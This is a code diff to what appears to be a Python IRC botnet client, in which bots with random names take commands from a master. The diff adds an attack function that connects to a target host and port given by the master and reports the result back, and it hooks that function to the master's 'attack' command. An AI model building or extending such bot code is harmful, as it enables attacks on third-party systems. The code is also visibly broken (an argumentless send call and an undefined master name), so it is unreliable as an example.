@@ -15,7 +15,6 @@ except Exception as err:
 
 
 
-
 def connect():
     while True:
         botname = "bot"+str(random.randint(0,999999))
@@ -63,6 +62,22 @@ def status(masterName):
     msg = "PRIVMSG "+masterName+" :Here\r\n"
     irc.send(msg.encode())
     return
+#use to attack
+def attack(hostname,port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        s.connect((hostname,int(port)))
+        s.send()
+        msg = "PRIVMSG "+masterName+" :success\r\n"
+        irc.send(msg.encode())
+    except:
+        msg = "PRIVMSG "+masterName+" :fail\r\n"
+        irc.send(msg.encode())
+    return
+#use to move
+def move(hostname,port,channel):
+    return
 # use the listen to chat
 def listen():
     while True:
@@ -74,7 +89,7 @@ def listen():
         elif sphrase == (inmsg[2].split())[0]:
             print ("serving master!")
             if (inmsg[2].split())[1] == 'attack':
-                pass
+                attack(inmsg[2].split()[2],inmsg[2].split()[3])
             elif (inmsg[2].split())[1] == 'status':
                 status(inmsg[1].split("!")[0])
             elif (inmsg[2].split())[1] == 'move':
